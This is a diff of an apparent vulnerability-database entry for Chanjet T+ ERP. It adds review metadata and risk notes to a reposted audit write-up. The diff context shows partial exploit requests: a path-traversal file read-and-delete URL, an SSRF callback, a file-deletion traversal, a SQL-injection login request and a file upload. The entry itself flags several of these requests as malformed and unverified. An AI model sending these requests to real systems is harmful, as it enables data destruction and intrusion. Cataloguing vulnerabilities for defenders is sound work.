@@ -1,11 +1,52 @@
 ---
-fofa: "** **app="
 source: "MrWQ/vulnerability-paper"
+title: "畅捷通T+ 六类漏洞研究集合"
+product: "畅捷通T+"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "接口表12.3/13/15/16不是每漏洞影响版本；v17<=含义歧义"
+prerequisites: "前台声明与上传后台会话须分"
+side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/XAqf4ZStCIIzlZ7Cqu1qNQ"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%95%85%E6%8D%B7%E9%80%9A/%E7%95%85%E6%8D%B7%E9%80%9A%20T%2B%20Plus%20%E5%AE%A1%E8%AE%A1%20%EF%BC%88%E8%B6%85%E8%AF%A6%E7%BB%86%EF%BC%89.md"
+fofa_unverified: "** **app="
+id: "vw-2d7f889e7211822c21889939"
+entity_id: "ve-2d7f889e7211822c21889939"
+schema_version: "1"
 ---
 
-# 畅捷通 T+ Plus 审计 （超详细）
+# 畅捷通T+ 六类漏洞研究集合
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：畅捷通T+；六类漏洞研究集合
+- 版本、配置及部署条件：接口表12.3/13/15/16不是每漏洞影响版本；v17<=含义歧义
+- 认证与权限前提：前台声明与上传后台会话须分
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 拆下载后删除、备份路径泄露、TestConnnect回连、DeleteSingleImage删除、CheckPassword SQLi、UserFileUpload六实体并关联215
+- DownLoadWmsUploadedFileLog读取后删除明确破坏性，不能当只读检测
+- DNS回连不证明任意协议完整SSRF；Base64是编码非加密
+- 多请求缺头体空行；上传multipart缺name/filename且boundary头体不匹配，全文已损
+- 接口列表无认证证明，不可推广大部分无需鉴权；无各漏洞固定版本
+
+## 操作风险
+
+请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XAqf4ZStCIIzlZ7Cqu1qNQ)
 
 **0x00 前言**  
@@ -65,7 +106,7 @@ http://127.0.0.1/tplus/BaseInfo/DownLoadWmsUploadedFileLog.aspx?fileName=../../a
 
 **Payload:**
 
-```
+```http
 POST /tplus/ajaxpro/Ufida.T.SM.UIP.UA.AddressSettingController,Ufida.T.SM.UIP.ashx?method=TestConnnect HTTP/1.1
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
@@ -97,7 +138,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 **经检查发现删除目录为 /UserImages 使用 ../ 可进行跨目录 **Payload:****
 
-```
+```http
 POST /tplus/ajaxpro/Ufida.T.EAP.Voucher.WebController.AjaxImageService,Ufida.T.EAP.Voucher.WebController.ashx?method=DeleteSingleImage HTTP/1.1
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
@@ -133,7 +174,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 **Payload (放入 Sqlmap 中跑即可):**
 
-```
+```http
 POST /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
@@ -191,7 +232,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 Payload:
 
-```
+```http
 POST /tplus/CommonPage/UserFileUpload.aspx HTTP/1.1
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
@@ -200,7 +241,7 @@ Cache-Control: no-cache
 Connection: keep-alive
 Content-Length: 775
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMXNLGZirKX5UAvYG
-Cookie: LOGIN_LANG=cn; ASP.NET_SessionId=oafhmiapxpe5vqesdwm4oms5; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1674191380,1674378083,1674393050,1674536169; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1674543095
+Cookie: LOGIN_LANG=cn; ASP.NET_SessionId=o**********************5; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1674191380,1674378083,1674393050,1674536169; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1674543095
 Host: 127.0.0.0
 Origin: http://127.0.0.0
 Pragma: no-cache
